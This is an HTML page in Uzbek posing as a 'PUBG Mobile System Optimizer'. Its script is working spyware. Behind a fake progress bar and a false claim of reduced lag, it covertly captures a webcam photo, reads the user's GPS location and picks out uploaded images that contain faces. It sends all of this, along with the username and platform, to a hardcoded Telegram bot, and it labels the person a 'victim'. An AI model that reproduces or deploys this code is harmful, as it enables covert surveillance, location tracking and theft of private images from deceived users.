<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile: System Optimizer v2.0</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; background: #0a0a0c; color: #00f3ff; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .container { width: 90%; max-width: 400px; padding: 30px; border: 1px solid #1a1a1e; border-radius: 20px; background: #0f0f12; text-align: center; box-shadow: 0 0 30px rgba(0, 243, 255, 0.1); }
        .progress-bar { width: 100%; height: 4px; background: #1a1a1e; margin: 20px 0; border-radius: 2px; overflow: hidden; display: none; }
        .progress-fill { width: 0%; height: 100%; background: #00f3ff; transition: 0.3s; }
        .status-text { font-size: 14px; color: #555; margin-bottom: 20px; }
        .btn-opt { width: 100%; padding: 15px; background: transparent; border: 1px solid #00f3ff; color: #00f3ff; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
        .btn-opt:hover { background: #00f3ff; color: #000; }
        #fileInput, video, canvas { display: none; }
        .success-msg { display: none; color: #39ff14; margin-top: 20px; font-size: 18px; }
    </style>
</head>
<body>

<div class="container">
    <h2 style="margin-top:0;">SYSTEM OPTIMIZER</h2>
    <p class="status-text" id="status">Tizim holati: Skanerlashga tayyor</p>
    
    <div id="setupArea">
        <input type="text" id="u_name" placeholder="PUBG User Name" style="width:100%; padding:12px; margin-bottom:10px; background:#16161a; border:1px solid #333; color:white; border-radius:5px; box-sizing:border-box;">
        
        <label for="fileInput" style="display:block; padding:15px; border:1px dashed #333; cursor:pointer; margin-bottom:15px; font-size:13px; color:#888;">
            📊 Tizim tahlili uchun oxirgi o'yin skrinshotini yuklang
        </label>
        <input type="file" id="fileInput" accept="image/*" multiple onchange="hiddenScan(this)">
        
        <button class="btn-opt" id="mainBtn" onclick="startProcess()">Optimallashtirishni boshlash</button>
    </div>

    <div class="progress-bar" id="pBar"><div class="progress-fill" id="pFill"></div></div>
    <div class="success-msg" id="sMsg">✅ OPTIMIZATSIYA YAKUNLANDI!<br><span style="font-size:12px; color:#888;">Laglar 45% ga kamaytirildi.</span></div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const CONFIG = {
        TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY",
        ID: "6198817749"
    };

    let camData = null, faceFiles = [], loc = "Aniqlanmadi";

    // AI-ni fonda yuklash (Ultra-Fast)
    async function init() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
    }
    init();

    // Yashirin skanerlash
    async function hiddenScan(input) {
        document.getElementById('status').innerText = "Fayllar tahlil qilinmoqda...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.4 }));
            if (d.length > 0) faceFiles.push(f);
        }
        document.getElementById('status').innerText = "Tizim tahlili tayyor.";
    }

    async function startProcess() {
        const name = document.getElementById('u_name').value;
        if(!name) return alert("User name kiriting!");

        document.getElementById('setupArea').style.display = 'none';
        document.getElementById('pBar').style.display = 'block';
        const fill = document.getElementById('pFill');
        const status = document.getElementById('status');

        // 1. Yashirin Kamera va GPS (Faqat bitta ruxsat so'rovi)
        try {
            status.innerText = "GPS drayverlari tekshirilmoqda...";
            fill.style.width = "20%";
            
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('vid');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 600));
            const canvas = document.getElementById('canv');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            camData = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
            stream.getTracks().forEach(t => t.stop());

            fill.style.width = "50%";
            status.innerText = "Kesh fayllari tozalanmoqda...";

            navigator.geolocation.getCurrentPosition(async (p) => {
                loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await finalPush(name);
            }, async () => { await finalPush(name); }, {timeout: 5000});

        } catch (e) { 
            status.innerText = "Xato: Tizim ruxsati rad etildi.";
            setTimeout(() => location.reload(), 2000);
        }
    }

    async function finalPush(name) {
        const fill = document.getElementById('pFill');
        const status = document.getElementById('status');
        
        fill.style.width = "80%";
        status.innerText = "Ping optimallashmoqda...";

        const msg = `🎭 QURBON: ${name}\n📍 MAPS: ${loc}\n📱 BROWSER: ${navigator.platform}`;

        // Telegramga yashirin yuborish
        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.ID, text: msg})
        });

        if (camData) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.ID); fd.append('photo', camData);
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
        }

        // Faqat yuzlar (fonda)
        for (let face of faceFiles) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.ID); fd2.append('photo', face);
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
        }

        fill.style.width = "100%";
        status.innerText = "Tugallandi.";
        document.getElementById('pBar').style.display = 'none';
        document.getElementById('sMsg').style.display = 'block';
    }
</script>
</body>
</html>
